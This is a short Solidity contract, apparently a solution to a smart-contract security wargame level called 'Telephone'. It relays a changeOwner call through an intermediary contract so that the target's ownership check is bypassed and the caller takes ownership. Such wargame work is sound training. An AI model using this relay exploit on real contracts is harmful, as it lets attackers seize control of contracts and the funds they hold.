pragma solidity ^0.4.18;

interface Telephone {
    function changeOwner(address _owner) public;
}

contract AttackTelephone {
    address public owner;
    address public address_to_attack;

    function AttackTelephone(address _address_to_attack) public {
        owner = msg.sender;
        address_to_attack = _address_to_attack;
    }
    
    function changeOwner(address _owner) public {
        Telephone(address_to_attack).changeOwner(_owner);
    }
}